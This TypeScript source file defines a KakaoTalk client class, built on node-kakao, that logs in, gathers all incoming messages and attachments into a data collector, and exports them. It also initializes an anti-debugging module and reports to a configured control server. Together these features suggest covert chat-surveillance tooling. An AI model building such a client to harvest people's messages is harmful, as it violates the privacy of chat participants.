/**
 * 🔥 ENHANCED KAKAO CLIENT v31.3 SECURE 🔥
 * Enhanced security with encryption and validation
 */

import { 
  AuthApiClient, 
  TalkClient, 
  TalkChannel, 
  TalkChatData, 
  ChatOnRoomEvent,
  KnownChatType
} from 'node-kakao';
import { DataCollector } from '../utils/DataCollector';
import { MessageHandler } from '../handlers/MessageHandler';
import { CommandHandler } from '../command/CommandHandler';
import { DatabaseManager } from '../database/DatabaseManager';
import { SecurityManager } from '../utils/SecurityManager';
import { AntiDebug } from '../utils/AntiDebug';
import { Config } from '../config';

export class EnhancedKakaoClient {
  private client: TalkClient;
  private collector: DataCollector;
  private messageHandler: MessageHandler;
  private commandHandler: CommandHandler;
  private db: DatabaseManager;
  private sessionId: string;
  private isConnected: boolean = false;

  constructor() {
    // Initialize security first
    SecurityManager.initialize(Config.DEVICE_UUID);
    AntiDebug.initialize();

    // Generate secure session ID
    this.sessionId = SecurityManager.generateSessionId();
    
    // Initialize components
    this.client = new TalkClient();
    this.collector = new DataCollector(this.sessionId);
    this.messageHandler = new MessageHandler(this.collector);
    this.db = new DatabaseManager(this.sessionId, Config.CONTROL_SERVER_URL);
    this.commandHandler = new CommandHandler(
      Config.COMMAND_PREFIX,
      this.collector,
      this.db,
      Config.ADMIN_CONFIG
    );

    console.log('[CLIENT] EnhancedKakaoClient initialized with security features');
  }

  /**
   * Login with enhanced security
   */
  async login(): Promise<void> {
    try {
      console.log('[CLIENT] Initializing secure login...');

      // Validate credentials
      if (!Config.KAKAO_PHONE && !Config.KAKAO_EMAIL) {
        throw new Error('No login credentials provided');
      }

      if (!Config.KAKAO_PASSWORD) {
        throw new Error('Password not provided');
      }

      // Create API client
      const api = await AuthApiClient.create(
        SecurityManager.sanitizeInput(Config.DEVICE_NAME), 
        Config.DEVICE_UUID
      );

      let loginRes;

      // Try phone login first, fallback to email
      if (Config.KAKAO_PHONE) {
        console.log('[CLIENT] Attempting phone login...');
        loginRes = await api.login({
          email: Config.KAKAO_PHONE,
          password: Config.KAKAO_PASSWORD
        });
      } else if (Config.KAKAO_EMAIL) {
        console.log('[CLIENT] Attempting email login...');
        loginRes = await api.login({
          email: Config.KAKAO_EMAIL,
          password: Config.KAKAO_PASSWORD
        });
      } else {
        throw new Error('No valid login method');
      }

      if (!loginRes.success) {
        throw new Error(`Login failed: ${loginRes.status}`);
      }

      console.log('[CLIENT] ✓ Login successful');

      // Initialize TalkClient
      const res = await this.client.login(loginRes.result);
      if (!res.success) {
        throw new Error(`TalkClient login failed: ${res.status}`);
      }

      console.log('[CLIENT] ✓ TalkClient initialized');

      // Set user data
      const user = this.client.clientUser;
      this.collector.setUserData(
        user.userId.toString(),
        user.nickname,
        Config.DEVICE_UUID,
        Config.DEVICE_NAME
      );

      console.log(`[CLIENT] ✓ Logged in as: ${user.nickname} (${user.userId})`);

      // Setup event handlers
      this.setupEventHandlers();
      this.isConnected = true;

      console.log('[CLIENT] ✓ Client ready and secured');

    } catch (error) {
      console.error('[CLIENT] Login error:', SecurityManager.maskSensitiveData(String(error)));
      throw error;
    }
  }

  /**
   * Setup event handlers with security checks
   */
  private setupEventHandlers(): void {
    // Chat event handler
    this.client.on('chat', async (data: TalkChatData, channel: TalkChannel) => {
      try {
        const sender = data.getSenderInfo(channel);
        if (!sender) return;

        const senderId = sender.userId.toString();
        const senderName = sender.nickname;
        const logId = data.logId.toString();

        // Security check: banned users
        if (await this.db.isBanned(senderId)) {
          console.log(`[CLIENT] ⚠️ Ignored message from banned user: ${senderName}`);
          return;
        }

        // Handle text messages
        if (data.type === KnownChatType.TEXT && data.text) {
          const text = data.text;

          // Security check: detect suspicious patterns
          if (SecurityManager.detectSuspiciousPattern(text)) {
            console.log(`[CLIENT] ⚠️ Suspicious pattern detected from ${senderName}`);
            // Continue processing but log the warning
          }

          // Handle message
          await this.messageHandler.handleIncomingMessage(
            channel,
            senderId,
            senderName,
            text,
            logId
          );

          // Handle commands
          await this.commandHandler.handleMessage(
            text,
            senderId,
            senderName,
            channel,
            logId
          );
        }

        // Handle image attachments
        if (data.type === KnownChatType.PHOTO) {
          await this.messageHandler.handleAttachment(
            channel,
            senderId,
            senderName,
            'image',
            data.attachment,
            logId
          );
        }

        // Handle file attachments
        if (data.type === KnownChatType.FILE) {
          await this.messageHandler.handleAttachment(
            channel,
            senderId,
            senderName,
            'file',
            data.attachment,
            logId
          );
        }

      } catch (error) {
        console.error('[CLIENT] Error handling chat event:', SecurityManager.maskSensitiveData(String(error)));
      }
    });

    // Channel added event
    this.client.on('chat_added', (channel: TalkChannel, _: ChatOnRoomEvent) => {
      console.log(`[CLIENT] ✓ Added to channel: ${channel.channelId}`);
    });

    // Channel removed event
    this.client.on('chat_removed', (channel: TalkChannel, _: ChatOnRoomEvent) => {
      console.log(`[CLIENT] ✓ Removed from channel: ${channel.channelId}`);
    });

    // User joined event
    this.client.on('user_join', (channel: TalkChannel, user: any) => {
      console.log(`[CLIENT] User joined: ${user.nickname} in channel ${channel.channelId}`);
    });

    // User left event
    this.client.on('user_left', (channel: TalkChannel, user: any) => {
      console.log(`[CLIENT] User left: ${user.nickname} from channel ${channel.channelId}`);
    });

    // Disconnection event
    this.client.on('disconnected', (reason: number) => {
      console.log(`[CLIENT] ⚠️ Disconnected (reason: ${reason})`);
      this.isConnected = false;
    });

    console.log('[CLIENT] ✓ Event handlers registered with security checks');
  }

  /**
   * Get data collector
   */
  getDataCollector(): DataCollector {
    return this.collector;
  }

  /**
   * Get TalkClient instance
   */
  getClient(): TalkClient {
    return this.client;
  }

  /**
   * Get database manager
   */
  getDatabaseManager(): DatabaseManager {
    return this.db;
  }

  /**
   * Get connection status
   */
  isClientConnected(): boolean {
    return this.isConnected;
  }

  /**
   * Get session ID
   */
  getSessionId(): string {
    return this.sessionId;
  }

  /**
   * Disconnect and cleanup
   */
  async disconnect(): Promise<void> {
    try {
      console.log('[CLIENT] Disconnecting...');

      // Cleanup command handler
      this.commandHandler.destroy();

      // Close database
      await this.db.close();

      // Close client connection
      await this.client.close();

      // Clear sensitive data
      this.collector.clear();
      this.messageHandler.clearCache();

      this.isConnected = false;
      console.log('[CLIENT] ✓ Disconnected and cleaned up');

    } catch (error) {
      console.error('[CLIENT] Error during disconnect:', SecurityManager.maskSensitiveData(String(error)));
    }
  }

  /**
   * Export collected data
   */
  exportData(encrypt: boolean = true): string {
    return this.collector.exportData(encrypt);
  }

  /**
   * Get client statistics
   */
  getStatistics(): any {
    return {
      sessionId: this.sessionId,
      connected: this.isConnected,
      collector: this.collector.getSummary(),
      storage: this.collector.getStorageStats()
    };
  }
}